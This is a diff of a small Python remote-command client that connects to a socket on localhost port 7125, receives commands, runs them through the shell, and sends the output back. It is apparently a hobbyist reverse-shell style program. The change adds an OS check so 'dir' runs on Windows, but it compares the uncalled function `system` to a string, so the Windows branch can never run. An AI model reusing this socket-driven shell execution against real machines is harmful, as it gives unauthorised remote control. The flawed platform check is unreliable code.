@@ -3,6 +3,7 @@
 import socket
 from os import chdir
 from subprocess import check_output
+from platform import system
 sock = socket.socket()
 sock.connect(('localhost', 7125))
 
@@ -16,7 +17,10 @@ while 1:
     try:
         if 'cd' in x.decode():
             chdir(x[3:])
-            out = check_output("ls", shell=True)
+            if system == "Windows":
+                out = check_output("dir", shell=True)
+            else :
+                out = check_output("ls", shell=True)
             sock.send(out)
         elif x.decode('utf-8') == "":
             sock.close()
